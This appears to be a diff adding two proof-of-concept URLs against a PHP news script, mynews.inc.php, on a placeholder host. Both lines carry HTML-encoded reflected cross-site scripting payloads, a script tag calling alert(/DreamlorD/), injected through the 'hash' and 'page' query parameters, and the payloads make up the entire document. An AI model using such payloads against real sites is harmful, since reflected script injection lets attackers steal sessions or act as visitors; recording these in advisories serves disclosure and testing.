@@ -1,0 +1,2 @@
+http://www.example.com/path/mynews.inc.php?hash=&quot;&gt;&lt;script&gt;alert(/DreamlorD/)&lt;/script&gt;
+http://www.example.com/path/mynews.inc.php?hash=cce496a942d7279c14d7da556c14c7b6&amp;mnid=2&amp;page=&quot;&gt;&lt;script&gt;alert(/DreamlorD/)&lt;/script&gt;
